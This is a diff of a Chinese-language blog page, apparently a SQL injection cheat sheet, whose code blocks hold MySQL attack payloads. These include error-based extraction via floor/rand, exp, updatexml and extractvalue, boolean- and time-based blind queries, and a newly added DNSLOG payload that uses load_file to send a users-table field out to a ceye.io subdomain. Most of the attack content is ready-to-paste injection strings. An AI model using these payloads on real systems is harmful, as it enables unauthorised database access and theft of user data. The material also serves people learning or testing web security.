@@ -86,7 +86,7 @@
 <meta property="og:site_name" content="Fxven Blog">
 <meta property="og:description" content="MySQL基本注入点 GET、POST、Headers    测试 &amp;#39;  &amp;quot;   or 1=1  and 1=2  # &amp;gt; % 23  --+  基本函数1concat()、concat_ws()、group_contact() 基本语句 databases1select databases(); tables1select group_concat(table_name)">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-11-05T12:40:58.318Z">
+<meta property="og:updated_time" content="2018-11-07T12:10:28.653Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Sql Injection">
 <meta name="twitter:description" content="MySQL基本注入点 GET、POST、Headers    测试 &amp;#39;  &amp;quot;   or 1=1  and 1=2  # &amp;gt; % 23  --+  基本函数1concat()、concat_ws()、group_contact() 基本语句 databases1select databases(); tables1select group_concat(table_name)">
@@ -356,14 +356,15 @@
 <h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><h3 id="Error-injection"><a href="#Error-injection" class="headerlink" title=" Error-injection "></a><strong> Error-injection </strong></h3><p> 对于 <code>select</code> ……<br> 对于 <code>update、insert</code>     </p>
 <p>  <strong> floor()+ count()+group by </strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat(&apos;#&apos;,(select database()),floor(rand()*2))a from information_schema.tables group by a) b)#</span><br></pre></td></tr></table></figure></p>
 <p>  <strong> exp() </strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exp(~(select * from (select database() ) a) );</span><br></pre></td></tr></table></figure></p>
-<p>  bigint()  (MySQL version &gt;= 5.4.45)  </p>
+<p>  <strong>bigint()</strong> (MySQL version &gt;= 5.4.45)  </p>
 <p>  <strong> updatexml() </strong>  (MySQL version &gt;= 5.1.5)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x23,(select * from (select concat_ws(&apos;#&apos;,fileds_name) from users limit 0,1)a ) ),1)#</span><br></pre></td></tr></table></figure></p>
 <p>  <strong> extractvalue() </strong>  (MySQL version &gt;= 5.1.5)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(0x23,(select * from (select concat_ws(&apos;#&apos;,fileds_name) from users limit 0,1) a) ) )#</span><br></pre></td></tr></table></figure></p>
 <h3 id="Blinds"><a href="#Blinds" class="headerlink" title="Blinds"></a><strong>Blinds</strong></h3><p>用的的函数: <code>substr()、ascii()、length()、if()、sleep()</code> </p>
 <h4 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h4><p>二分法</p>
 <h4 id="Booleanbase"><a href="#Booleanbase" class="headerlink" title="Booleanbase"></a><strong>Booleanbase</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or substr((select group_concat(fileds) from table_name limit 0,1),1,1)&gt;&apos;a&apos;#</span><br></pre></td></tr></table></figure>
 <h4 id="Timebase"><a href="#Timebase" class="headerlink" title="Timebase"></a><strong>Timebase</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or if(substr((select group_concat(fileds) from table_name limit 0,1),1,1)&gt;&apos;a&apos;,sleep(5),1)#</span><br></pre></td></tr></table></figure>
-<h4 id="DNSLOG"><a href="#DNSLOG" class="headerlink" title="DNSLOG"></a>DNSLOG</h4>
+<h4 id="DNSLOG"><a href="#DNSLOG" class="headerlink" title="DNSLOG"></a><strong>DNSLOG</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((select load_file(concat(&apos;\\\\&apos;,(select fileds from users limit 0,1),&apos;.xxx.ceye.io\\abc&apos;))),1,0)%23</span><br></pre></td></tr></table></figure>
+
       
     </div>
     
